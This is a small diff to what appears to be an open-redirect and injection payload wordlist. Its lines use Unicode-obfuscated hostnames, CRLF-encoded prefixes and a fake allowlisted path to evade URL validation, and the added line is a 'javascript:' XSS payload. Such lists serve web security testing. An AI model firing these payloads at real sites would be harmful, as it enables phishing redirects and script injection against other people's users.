@@ -464,3 +464,4 @@ https://%0a%0dⓁ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ
 Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
 https://Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
 //Ⓛ𝐨𝗰𝐀𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/www.whitelisteddomain.tld
+javascript:alert(document.domain)//://
